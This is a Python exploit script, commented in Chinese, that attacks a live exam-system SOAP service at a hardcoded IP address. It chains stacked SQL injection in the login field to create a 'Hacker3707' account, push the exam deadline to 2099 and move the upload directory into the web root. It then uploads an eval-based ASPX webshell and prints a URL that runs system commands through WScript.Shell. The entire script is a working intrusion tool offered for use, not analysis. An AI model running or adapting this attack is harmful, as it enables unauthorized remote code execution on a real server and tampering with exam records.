import requests
import base64
import re
import time

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
TARGET_UID = 3707
SHELL_FILENAME = "s_3707.aspx"
SHELL_CODE = r'<%@ Page Language="Jscript"%><%eval(Request.Item["c"],"unsafe");%>'
WEB_ROOT = r"e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web"

HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def send_sql(desc, sql):
    print(f"[*] SQL注入: {desc}")
    # print(f"    Payload: {sql}")
    injection = f"admin'; {sql}; --"
    safe_username = injection.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")

    soap = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <Login xmlns="http://tempuri.org/">
          <username>{safe_username}</username>
          <pwd>pass</pwd>
        </Login>
      </soap:Body>
    </soap:Envelope>"""

    try:
        requests.post(TARGET_URL, data=soap.encode('utf-8'), headers=HEADERS, timeout=5)
    except:
        pass

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def exploit():
    print(f"=== 开始对 ID {TARGET_UID} 进行全自动破解 ===")

    # 1. 逻辑绕过与配置修改
    print("\n[Step 1] 修改系统配置与用户状态...")

    # [强化] 确保 3707 用户存在且配置有效
    # 策略: 尝试从 9207 (已知存在) 复制数据创建 3707，或者更新 3707
    # 9207 是我们之前的肉鸡，配置肯定是全的（虽然可能被改过，但至少记录存在）

    print("[*] SQL注入: 确保 3707 账户存在 (复制 9207)")
    # 使用 IF NOT EXISTS 避免重复插入报错
    # 假设 9207 存在。
    sql_ensure_user = """
    IF NOT EXISTS (SELECT * FROM Exam2020Stu WHERE ID=3707)
        INSERT INTO Exam2020Stu (ID, Code1, Name, ExamKey, Submitted)
        SELECT 3707, '3707', 'Hacker3707', ExamKey, 0 FROM Exam2020Stu WHERE ID=9207
    ELSE
        UPDATE Exam2020Stu SET ExamKey=(SELECT TOP 1 ExamKey FROM Exam2020Stu WHERE ID=9207), Submitted=0 WHERE ID=3707
    """
    send_sql("创建/修复 3707 用户", sql_ensure_user)

    # 延长考试时间
    # 既然我们要用 9207 的 ExamKey，那我们就确保这个 Key 对应的 Config 是解锁的
    send_sql("延长考试时间 (StopTime -> 2099)", "UPDATE Exam2020Config SET Value='2099-12-31 23:59:59' WHERE Name='StopTime'")

    # 修改上传路径为 Web 根目录
    path_sql = WEB_ROOT.replace("'", "''")
    send_sql(f"劫持上传路径 (AnswerPath -> {WEB_ROOT})", f"UPDATE Exam2020Config SET Value='{path_sql}' WHERE Name='AnswerPath'")

    # 再次强制重置提交状态 (双重保险)
    send_sql(f"重置用户 {TARGET_UID} 提交状态", f"UPDATE Exam2020Stu SET Submitted=0 WHERE ID={TARGET_UID}")

    time.sleep(2) # 等待数据库生效

    # 2. 上传 WebShell
    print(f"\n[Step 2] 上传 WebShell ({SHELL_FILENAME})...")
    encoded_filename = to_html_entities(SHELL_FILENAME)
    file_b64 = base64.b64encode(SHELL_CODE.encode('utf-8')).decode('utf-8')

    soap_upload = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <UploadAnswer xmlns="http://tempuri.org/">
          <uid>{TARGET_UID}</uid>
          <aid>1</aid> <filename>{encoded_filename}</filename>
          <file>{file_b64}</file>
        </UploadAnswer>
      </soap:Body>
    </soap:Envelope>"""

    try:
        resp = requests.post(TARGET_URL, data=soap_upload.encode('utf-8'), headers=HEADERS, timeout=10)
        # 打印完整响应以调试
        # print(f"[DEBUG] Upload Response: {resp.text}")

        if resp.status_code == 200:
             if "OK" in resp.text:
                print("    [+] 上传成功 (Server returned OK)")
             elif "UploadAnswerResult" in resp.text:
                # 提取 Result 内容
                res_match = re.search(r"<UploadAnswerResult>(.*?)</UploadAnswerResult>", resp.text)
                if res_match:
                    print(f"    [+] 上传响应: {res_match.group(1)}")
                else:
                    print(f"    [?] 响应内容不含预期结果: {resp.text[:200]}")
             else:
                 print(f"    [!] 响应异常: {resp.text[:200]}")
        else:
            print(f"    [-] 上传失败: {resp.status_code}")
            print(f"    {resp.text[:200]}")
            return
    except Exception as e:
        print(f"    [!] 上传异常: {e}")
        return

    # 3. 获取路径并计算 URL
    print(f"\n[Step 3] 获取 Shell 路径...")
    soap_list = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <GetUploadFiles xmlns="http://tempuri.org/">
          <uid>{TARGET_UID}</uid>
        </GetUploadFiles>
      </soap:Body>
    </soap:Envelope>"""

    try:
        resp_list = requests.post(TARGET_URL, data=soap_list.encode('utf-8'), headers=HEADERS, timeout=10)

        # 打印列表响应调试
        print(f"[DEBUG] GetUploadFiles Response Length: {len(resp_list.text)}")
        if "UploadeFiles" not in resp_list.text:
             print("    [!] 响应中未包含 UploadeFiles 数据表，可能列表为空或用户不存在。")
             print(f"    [DEBUG] {resp_list.text[:500]}") # 打印部分响应

        # 匹配 FullPath

        # e:\Web\EXE\Eiven.EXE.Web\Eiven.EXE.Web\Answer\...\s_3707.aspx
        match = re.search(f"<FullPath>(.*?{SHELL_FILENAME})</FullPath>", resp_list.text)

        if match:
            full_path = match.group(1)
            print(f"    [+] 物理路径: {full_path}")

            web_root_marker = r"Eiven.EXE.Web\Eiven.EXE.Web"
            if web_root_marker in full_path:
                rel_path = full_path.split(web_root_marker)[1]
                url_path = rel_path.replace("\\", "/")

                # URL 编码中文路径
                # 简单处理：先按 / 分割，再对每一段进行 quote
                import urllib.parse
                parts = url_path.split('/')
                encoded_parts = [urllib.parse.quote(p) for p in parts]
                encoded_url_path = "/".join(encoded_parts)

                shell_url = f"http://120.55.241.236:999{encoded_url_path}"

                print(f"\n[★ SUCCESS] Shell 已就绪!")
                print(f"    URL: {shell_url}")
                print(f"    CMD: {shell_url}?c=var%20d=new%20ActiveXObject(%22WScript.Shell%22);var%20o=d.Exec(%22cmd%20/c%20whoami%22);Response.Write(o.StdOut.ReadAll());")
            else:
                print(f"    [!] 路径不在预期的 Web 根目录下，无法自动生成 URL。")
        else:
            print("    [-] 未找到文件路径，可能上传未成功写入。")

    except Exception as e:
        print(f"    [!] 获取路径异常: {e}")

if __name__ == "__main__":
    exploit()
